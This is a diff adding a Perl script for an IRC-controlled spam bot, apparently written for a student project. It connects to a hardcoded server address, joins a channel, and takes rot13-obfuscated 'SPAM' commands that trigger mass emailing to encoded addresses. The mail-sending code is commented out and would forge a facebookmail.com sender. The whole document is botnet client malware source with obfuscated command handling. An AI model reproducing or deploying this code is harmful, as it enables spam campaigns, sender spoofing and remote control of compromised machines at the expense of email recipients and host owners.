@@ -1,0 +1,116 @@
+```#!/usr/bin/env perl
+use strict;
+use warnings;
+use IO::Socket;
+use IO::Handle;
+use Net::SMTP;
+my ($sock, $buffer);
+
+#NETWORK INFORMATION
+my $server = "83.192.53.201";
+my $port = "6565";
+
+#BOT SETTINGS
+my $mynick = "Bot7";
+my $ident = "Bot7";
+my $realname = "Bot7";
+my $channel = "#CuU12JkLoaiiKmNA";
+
+$sock = IO::Socket::INET->new(    
+  PeerAddr => $server,   
+  PeerPort => $port,                  
+  Proto => 'tcp',
+  Timeout => 30
+) || die "Could not connect to server: $!\n";
+
+sub quote {
+  my ($msg) = @_;
+  print $sock "$msg\r\n";
+  print "S: $msg\n";
+}
+
+my %_commands = (
+  PING => sub {   
+    my ($cmd, $source) = @_; 
+    quote("PONG $source");
+ },
+);
+
+my %commands = (     
+  '001' => sub {  
+    my ($server, $cmd, $target, @msg) = @_; 
+    quote("JOIN $channel");
+  },
+  PRIVMSG => sub {
+    my ($src, $cmd, $target, @msg) = @_;
+
+	if ($#msg + 1 == 5 and $msg[0] eq ":" . rot13($mynick)  and $msg[1] eq "FCNZ"){
+		sendMail(rot13($msg[2]) . "@" . rot13($msg[3]), $msg[4]);
+		quote("PRIVMSG $target :Fcnz frag gb $msg[2] $msg[3] $msg[4]");
+	}
+  },
+);
+
+sub sendMail {
+	my $mail = shift;
+	my $numMsg = shift;
+	
+	# Script d'envoi de SPAM (Imaginez le fonctionnel dans le cadre de l'APP)
+	#my $smtp = Net::SMTP->new("127.0.0.1"); # Smtp Server here
+	#$smtp->mail("update+kr4yanaw52bx@facebookmail.com");
+	#$smtp->to($mail);
+	#$smtp->data();
+	#$smtp->datasend(getData($numMsg));
+	#$smtp->dataend();
+	#$smtp->quit();
+}
+
+sub getData {
+	my $numMsg = shift;
+	my $content = "";
+	
+    open(my $fh, "<", "msg" . $numMsg); 
+	{
+		$content = join("", <$fh>);
+    }
+    close $fh;
+	
+	return $content;	
+}
+
+sub rot13 {
+	my $msg = shift;
+	$msg =~ tr[a-zA-Z][n-za-mN-ZA-M];
+	return $msg;
+}
+
+quote("NICK $mynick");
+quote("USER $mynick 8 $ident :$realname");
+
+while ($buffer = <$sock>)
+{
+  print "R: $buffer";
+  chomp $buffer;
+
+  parse($buffer);
+}
+
+close $sock;
+
+sub parse {
+  my ($buffer) = @_; 
+  my @bits = split ' ', $buffer; 
+  my $source = $bits[0];
+  my $command = $bits[1];
+  my $target = $bits[2];
+  if (exists $commands{uc($command)}) 
+  {
+    $commands{$command}->(@bits); 
+  } 
+my $_command = $bits[0];
+  if (exists $_commands{uc($_command)})
+  {
+    $_commands{$_command}->(@bits); 
+  }
+}
+```
